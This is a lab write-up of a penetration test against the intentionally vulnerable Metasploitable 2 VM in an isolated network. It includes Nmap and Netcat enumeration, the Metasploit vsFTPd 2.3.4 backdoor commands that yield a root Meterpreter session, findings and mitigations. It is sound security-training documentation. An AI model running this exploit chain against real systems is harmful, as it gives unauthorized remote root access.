\# Metasploitable 2 Vulnerability Assessment Lab



\## Overview



This lab demonstrates a controlled vulnerability assessment and exploitation exercise against \*\*Metasploitable 2\*\*, an intentionally vulnerable Linux virtual machine designed for security training.



The assessment was performed from a Kali Linux testing VM within an isolated VirtualBox host-only network. Network discovery and service enumeration were followed by validation and controlled exploitation of a vulnerable FTP service.



The assessment successfully demonstrated how an exposed and vulnerable \*\*vsFTPd 2.3.4\*\* service could be exploited to obtain a Meterpreter session with \*\*root-level privileges\*\*.



\## Objectives



\* Identify the target system on an isolated lab network.

\* Perform network and service enumeration using Nmap.

\* Identify potentially vulnerable services and software versions.

\* Validate the FTP service banner.

\* Research and select an appropriate Metasploit module.

\* Perform controlled exploitation of the vulnerable FTP service.

\* Verify the privileges obtained through the exploit.

\* Document findings and security implications.

\* Preserve screenshots as evidence of the assessment.



\## Lab Environment



| System           | Role                            | IP Address     |

| ---------------- | ------------------------------- | -------------- |

| Kali Linux       | Security testing / attacker VM  | 192.168.56.104 |

| Metasploitable 2 | Intentionally vulnerable target | 192.168.56.105 |



\### Network Configuration



The systems were connected using a \*\*VirtualBox Host-Only Adapter\*\*.



The environment was isolated from external systems and used only for authorized security testing.



\## Target Identification



The Metasploitable 2 system was configured with the following IP address:



```text

192.168.56.105

```



Connectivity was verified from Kali Linux before beginning the assessment.



```bash

ping -c 4 192.168.56.105

```



The test returned four successful replies with 0% packet loss.



\## Service Enumeration



Nmap was used from Kali Linux to identify open ports and determine service versions.



```bash

nmap -sV 192.168.56.105 -oN \~/metasploitable-nmap.txt

```



The scan identified numerous services running on the intentionally vulnerable target.



One significant finding was:



```text

21/tcp open  ftp  vsftpd 2.3.4

```



A second FTP-related service was also identified:



```text

2121/tcp open  ftp  ProFTPD 1.3.1

```



The vsFTPd 2.3.4 service was selected for further investigation because this version is associated with a known backdoor vulnerability.



\### Evidence



!\[Nmap Service Enumeration](../screenshots/metasploitable-2/metasploitable-nmap-scan.png)



\## FTP Banner Validation



The FTP service on port 21 was manually validated using Netcat.



```bash

nc -nv 192.168.56.105 21

```



The service returned:



```text

220 (vsFTPd 2.3.4)

```



This independently confirmed the version identified by Nmap.



\## Vulnerability Identification



Metasploit Framework was used to search for a known vulnerability affecting the identified version.



```text

search vsftpd 2.3.4

```



The search identified:



```text

exploit/unix/ftp/vsftpd\_234\_backdoor

```



The module description identified the vulnerability as:



```text

VSFTPD v2.3.4 Backdoor Command Execution

```



The module was selected for controlled testing against the Metasploitable 2 target.



\## Exploitation



The Metasploit module was configured with the target and Kali testing system addresses.



```text

use exploit/unix/ftp/vsftpd\_234\_backdoor

set RHOSTS 192.168.56.105

set RPORT 21

set LHOST 192.168.56.104

```



The exploit was then executed against the isolated Metasploitable 2 system.



The exploitation succeeded and opened a Meterpreter session.



```text

\[\*] Meterpreter session 1 opened

```



\### Evidence



!\[Successful vsFTPd Exploitation](../screenshots/metasploitable-2/metasploitable-vsftpd-exploit.png)



\## Privilege Verification



The Meterpreter session was checked to determine the privileges obtained from the exploit.



```text

getuid

```



The session reported:



```text

Server username: root

```



This demonstrated that the exploit resulted in root-level access to the target.



\### Evidence



!\[Root Access](../screenshots/metasploitable-2/metasploitable-root-access.png)



\## System Information



Meterpreter system information identified the target as:



```text

Computer     : metasploitable.localdomain

OS           : Ubuntu 8.04

Kernel       : Linux 2.6.24-14-server

Architecture : x86

```



This information further confirmed the identity and operating environment of the compromised system.



\## Shell Verification



A shell was opened through the Meterpreter session.



```text

shell

```



The resulting Linux shell was used for non-destructive verification.



```bash

whoami

```



Returned:



```text

root

```



System information was also verified:



```bash

uname -a

```



Returned information identifying the system as:



```text

Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

```



The independent `whoami` result confirmed the root privileges previously reported by Meterpreter.



\### Evidence



!\[Shell Verification](../screenshots/metasploitable-2/metasploitable-shell-verification.png)



\## Security Findings



\### Finding 1 — Vulnerable FTP Service



\*\*Severity: Critical\*\*



The target exposed vsFTPd 2.3.4 on TCP port 21.



The installed version was associated with a known backdoor vulnerability that allowed remote command execution.



\### Finding 2 — Remote Root-Level Access



\*\*Severity: Critical\*\*



Successful exploitation resulted in a Meterpreter session running with root privileges.



The assessment demonstrated that an attacker able to reach the vulnerable service could potentially obtain complete control of the affected system.



\### Finding 3 — Outdated Operating System



\*\*Severity: Critical\*\*



The target was running Ubuntu 8.04 with an obsolete Linux kernel.



Legacy operating systems may contain numerous unpatched vulnerabilities and should not be exposed to untrusted networks.



\## Attack Chain



The assessment demonstrated the following attack path:



```text

Network Connectivity

&#x20;       ↓

Nmap Service Enumeration

&#x20;       ↓

vsFTPd 2.3.4 Identified

&#x20;       ↓

FTP Banner Validation

&#x20;       ↓

Metasploit Vulnerability Identification

&#x20;       ↓

Controlled Exploitation

&#x20;       ↓

Meterpreter Session

&#x20;       ↓

Root Privileges

&#x20;       ↓

Shell Verification

```



\## Mitigation Recommendations



For a production environment, the following controls would reduce the risk demonstrated by this lab:



1\. Remove unsupported and obsolete operating systems.

2\. Keep operating systems and applications fully patched.

3\. Upgrade or remove vulnerable FTP software.

4\. Disable unnecessary network services.

5\. Restrict administrative services using firewall rules and network segmentation.

6\. Monitor exposed services for suspicious connection attempts.

7\. Perform regular vulnerability assessments.

8\. Apply least-privilege principles to system services.

9\. Avoid exposing legacy FTP services directly to untrusted networks.



\## Limitations



This assessment was performed against an intentionally vulnerable training system.



The results should not be interpreted as evidence that the same vulnerability exists on other systems without independent testing.



The assessment was limited to the isolated Metasploitable 2 virtual machine at:



```text

192.168.56.105

```



No unauthorized external systems were targeted.



No destructive actions, data modification, persistence mechanisms, or malware were deployed during the assessment.



\## Ethical and Safety Considerations



This exercise was conducted in an isolated VirtualBox host-only environment using an intentionally vulnerable training target.



All exploitation activity was authorized and limited to the user's own laboratory environment.



The purpose of the exercise was to understand vulnerability discovery, exploitation, privilege verification, and defensive remediation.



\## Skills Demonstrated



\* Linux system administration

\* Network reconnaissance

\* Nmap service enumeration

\* Service/version identification

\* FTP banner analysis

\* Vulnerability identification

\* Metasploit Framework

\* Controlled exploitation

\* Meterpreter

\* Linux shell access

\* Privilege verification

\* Security assessment methodology

\* Evidence collection

\* Security documentation

\* Vulnerability remediation analysis



\## Key Takeaways



This lab demonstrated the importance of maintaining supported software, removing unnecessary services, and regularly assessing exposed systems for known vulnerabilities.



The assessment showed how a single vulnerable network service can provide an attacker with a path from initial network access to complete root-level control of a system.



The exercise also reinforced a repeatable security assessment workflow:



\*\*Enumerate → Identify → Validate → Exploit → Verify → Document → Remediate\*\*



